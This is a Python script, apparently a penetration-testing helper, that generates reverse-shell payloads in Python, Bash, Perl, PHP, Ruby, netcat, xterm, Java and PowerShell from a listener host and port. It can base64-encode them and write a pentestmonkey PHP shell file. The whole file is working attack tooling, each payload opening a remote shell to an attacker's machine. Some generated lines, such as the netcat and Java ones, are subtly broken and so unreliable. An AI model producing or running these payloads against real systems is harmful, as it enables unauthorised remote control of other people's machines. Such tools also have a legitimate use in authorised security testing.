#!/usr/bin/env python3


import time
import argparse
import sys
import os
import base64
import binascii

class Reverse_Shell_Generator:
        def __init__(self):
            self.control()
            self.Selcet()
        def Selcet(self):
            if "python" in self.args.type:
                 self.result = "python3 -c "\
                          +"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\
                          +'"'+f'{self.args.LHOST}'+'",'+f'{self.args.LPORT}'\
                          +"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("+'"/bin/bash"'+')'+"'"
                 self.Base64() 
            elif "bash" in self.args.type:
                    self.result=  "bash -i >& /dev/tcp/"+f'{self.args.LHOST}'+"/"+f'{self.args.LPORT}'+" 0>&1" 
                    self.Base64() 
            elif "perl" in self.args.type:
                 self.result = "perl -e 'use Socket;$i="+f'{self.args.LHOST}'\
                        +";$p="+f'{self.args.LPORT}'+";socket(S,PF_INET,SOCK_STREAM,getprotobyname("\
                        +'"tcp"'+"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"+'">&S"'\
                        +");open(STDOUT,"+'">&S"'+");open(STDERR,"+'">&S"'+");exec("+'"sh -i"'+");};'"
                 self.Base64() 
            elif 'php' in self.args.type and not  self.args.pentestmonkey:
                 self.result = "php -r '$sock=fsockopen("+'"'+f'{self.args.LHOST}'\
                         +'"'+","+f'{self.args.LPORT}'+");exec("\
                         +'"/bin/sh -i <&3 >&3 2>&3"'+");'"
                 self.Base64() 
            elif 'ruby' in self.args.type:
                 self.result = "ruby -rsocket -e'f=TCPSocket.open("+'"'\
                        +f'{self.args.LHOST}'+'"'+","+f'{self.args.LPORT}'\
                        +").to_i;exec sprintf("+'"/bin/sh -i <&%d >&%d 2>&%d"'\
                        +",f,f,f)"+"'"
                 self.Base64() 
            elif 'netcat' in self.args.type or 'nc' in self.args.type:
                 self.result = "nc -e /bin/sh"+f'{self.args.LHOST}'+" "+f'{self.args.LPORT}'
                 self.Base64() 
            elif 'xterm' in self.args.type:
                 self.result = 'xterm -display '+f'{self.args.LHOST}'+':'+f'{self.args.LPORT}'
                 self.Base64() 
            elif 'java' in self.args.type:
                  self.result = 'self.result = Runtime.getRuntime()'+'\n'+'process = self.result.exec(["/bin/bash","-c","exec 5<>/dev/tcp/'\
                           +f'{self.args.LHOST}'+'/'+f'{self.args.LPORT}'+';cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])'\
                           +'\n'+'process.waitFor()'
                  self.Base64()        
            elif 'powershell'  in self.args.type:
                 self.result = '$client = New-Object System.Net.Sockets.TCPClient("'+f'{self.args.LHOST}'+'",'+f'{self.args.LPORT}'+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'    
                 self.Base64()
            elif 'php' in self.args.type  and self.args.pentestmonkey:
                  if os.path.exists('PHP.php'):
                     os.remove("PHP.php")
                  else:
                       pass
                  LHOST = "$ip =  '"+f'{self.args.LHOST}'+"';"
                  LPORT = "$port = "+f'{self.args.LPORT}'+';'
                  with open ('./resources/pentestmonkey.txt' ,'r') as Monkey:
                             read_php = Monkey.readlines()
                  for line in read_php:
                      line = line.replace("$ip = 'LHOST';",LHOST)
                      line = line.replace("$port = LPORT;",LPORT)  
                      with open('PHP.php','a') as PHP_shell :
                           write_shell = PHP_shell.write(line)       
        def control(self):    
            parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]")      
            parser.add_argument("-t",'--type'            , metavar='' , action=None  ,required = True ,help   ="type of payload ") 
            parser.add_argument("-i","--LHOST"           , metavar='' , action=None  ,required = True ,help   ="listner ip ' Local Host'") 
            parser.add_argument("-p","--LPORT"           , metavar='' , action=None  ,required = True ,help   ="Listner port ")   
            parser.add_argument("-o","--output"          , metavar='' , action=None                   ,help   ="save the payload into the file")      
            parser.add_argument("-B64","--base64"               , action='store_true'                        ,help   ="encode the payload to base64 encode ")  
            parser.add_argument("-M","--pentestmonkey"   , action='store_true'                        ,help   ="genteate php pentestmonkey payload file ")  
            self.args = parser.parse_args()        
            if len(sys.argv)!=1 :
               pass
            else:
               parser.print_help()         
               exit()
        def Base64(self):
             if self.args.base64:
                  if 'powershell' in self.args.type:
                       self.result = 'powershell -e "'+ base64.b64encode(self.result.encode('utf-16')[2:]).decode()+'"'
                       print(self.result)
                  else:
                      self.result = bytes(self.result.encode())
                      self.result = base64.b64encode(self.result)
                      self.result = str(self.result).replace("b'",'',1).replace("'",'')
                      print(self.result)
             else:
                  print(self.result)
             if self.args.output:
                with open(self.args.output,'w') as File_write :
                     File_write.write(self.result)     
  
if __name__=='__main__':
   Reverse_Shell_Generator()  



